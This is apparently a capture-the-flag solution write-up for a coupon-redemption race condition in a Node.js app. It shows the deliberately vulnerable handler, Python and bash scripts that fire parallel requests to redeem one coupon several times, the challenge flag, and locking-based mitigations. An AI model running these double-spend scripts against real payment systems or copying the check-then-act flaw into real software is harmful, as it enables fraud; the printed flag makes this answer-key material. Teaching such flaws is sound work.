# Challenge 16: RaceCondition - Solution

## Vulnerability Type
**Race Condition / Time-of-Check Time-of-Use (TOCTOU)**

## Description
The coupon redemption has a check-then-act race condition with an artificial delay, allowing multiple simultaneous requests to bypass the "already redeemed" check.

## Vulnerable Code
```javascript
// VULNERABLE: check-then-act race condition (no mutex)
app.post('/redeem', async (req,res) => {
  const acc = getAccount(req.session.id_key);
  if (acc.redeemed) {
    return res.redirect('/');
  }
  // Artificial delay simulating DB operation - race window
  await new Promise(r => setTimeout(r, 50));
  acc.redeemed = true;
  acc.balance += 50;
```

## Exploitation Steps

### Step 1: Understand the Goal
- You start with $100
- Each account gets ONE $50 coupon
- The FLAG costs $200
- You need to redeem the coupon multiple times

### Step 2: Exploit the Race Condition
The vulnerability exists in the 50ms delay between checking `acc.redeemed` and setting it to `true`. If we send multiple requests simultaneously, they all pass the check before any of them sets the flag.

### Method 1: Using Browser (Manual)
1. Open the application in your browser
2. Open Developer Tools (F12) → Network tab
3. Click "Redeem $50 Coupon"
4. Right-click the POST request → Copy as cURL
5. Open multiple terminal windows
6. Paste and execute the cURL command simultaneously in all windows
7. Refresh the page to see increased balance

### Method 2: Using Python Script
```python
import requests
import threading

url = "http://[host]/redeem"
session = requests.Session()

# Login first to get session
session.get("http://[host]/")

def redeem():
    session.post(url)

# Send 5 simultaneous requests
threads = []
for i in range(5):
    t = threading.Thread(target=redeem)
    threads.append(t)
    t.start()

for t in threads:
    t.join()

print("Check your balance!")
```

### Method 3: Using Burp Suite Repeater
1. Capture the `/redeem` POST request in Burp
2. Send to Repeater
3. Create multiple tabs (Ctrl+R multiple times)
4. Click "Send" on all tabs as quickly as possible
5. Or use Burp Intruder with null payloads and parallel threads

### Method 4: Using curl in Bash
```bash
#!/bin/bash
# Get session cookie first
COOKIE=$(curl -c - http://[host]/ | grep session | awk '{print $7}')

# Send 5 parallel requests
for i in {1..5}; do
  curl -b "session=$COOKIE" -X POST http://[host]/redeem &
done
wait

echo "Done! Check your balance"
```

### Step 3: Buy the Flag
1. After successfully exploiting the race condition, your balance should be $200+
2. Click "Buy FLAG ($200)"
3. The flag will be displayed

## Flag
```
FCTF{r4c3_c0nd1t10n_d0ubl3_sp3nd}
```

## How It Works
1. Multiple requests arrive simultaneously
2. All requests pass the `if (acc.redeemed)` check (still false)
3. All requests wait 50ms
4. All requests set `acc.redeemed = true` and add $50
5. Result: coupon redeemed multiple times

## Timing Diagram
```
Request 1: Check (false) → Wait 50ms → Set true, Add $50
Request 2: Check (false) → Wait 50ms → Set true, Add $50
Request 3: Check (false) → Wait 50ms → Set true, Add $50
           ↑ All check before any set
```

## Mitigation
- Use atomic operations or database transactions
- Implement proper locking mechanisms:
  ```javascript
  const locks = new Map();
  
  app.post('/redeem', async (req,res) => {
    const key = req.session.id_key;
    if (locks.get(key)) return res.redirect('/');
    locks.set(key, true);
    
    try {
      const acc = getAccount(key);
      if (acc.redeemed) return res.redirect('/');
      await new Promise(r => setTimeout(r, 50));
      acc.redeemed = true;
      acc.balance += 50;
    } finally {
      locks.delete(key);
    }
    res.redirect('/');
  });
  ```
- Use database-level constraints (UNIQUE constraint on redemption)
- Implement optimistic locking with version numbers
- Use Redis or similar for distributed locks
- Apply idempotency keys for critical operations
